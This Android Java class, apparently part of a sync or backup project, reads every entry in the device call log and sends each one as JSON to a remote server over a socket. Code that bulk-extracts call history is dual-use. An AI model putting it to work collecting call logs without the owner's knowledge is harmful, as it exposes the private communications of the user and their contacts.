package edu.real.async.android;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.util.Log;
import android.provider.CallLog;

public class CallsSenderThread extends SenderThread {

    public CallsSenderThread(Context _ctx) {
        super(_ctx);
    }

    @Override
    protected void send() {
        Cursor cursor = ctx.getContentResolver().query(
               CallLog.Calls.CONTENT_URI, null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent
                                    // exception
            do {
                JSONObject o_call = new JSONObject();
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    try {
                        o_call.put(cursor.getColumnName(idx),
                                cursor.getString(idx));
                    } catch (JSONException e) {
                        Log.e("call-send", "Putting to JSONObject failed. "
                                + e.getMessage());
                        o_call = null;
                        break;
                    }
                }
                if (o_call == null) {
                    continue;
                }
                sOut.println("C" + o_call.toString());
                String resp;
                try {
                    resp = sIn.readLine();
                } catch (IOException e) {
                    Log.e("call-send", "Server response reading failed. "
                            + e.getMessage());
                    working = false;
                    break;
                }
                if (resp == null) {
                    Log.e("call-send",
                            "Server responsed nothing after call info sent. "
                            + resp);
                    working = false;
                    break;
                }
                if (!resp.equals("c")) {
                    Log.e("sms-send",
                            "Unexpected server response after call info sent. "
                            + resp);
                    working = false;
                    break;
                }
            } while (cursor.moveToNext());
        } else {
            // no calls
        }

    }

}
